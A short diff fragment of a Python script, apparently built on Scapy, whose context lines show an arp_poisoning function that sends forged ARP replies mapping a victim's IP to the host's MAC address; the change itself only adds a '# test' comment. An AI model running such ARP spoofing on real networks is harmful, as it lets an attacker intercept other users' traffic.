@@ -48,6 +48,7 @@ def arp_poisoning(target, victim):
     p = Ether(src=host_mac) / ARP(hwsrc=host_mac, psrc=victim['ip'], hwdst=target['mac'], pdst=target['ip'])
     sendp(p, iface='enp0s3')
 
+# test
 
 # arp_poisoning(target_ip, ip_to_spoof)
 
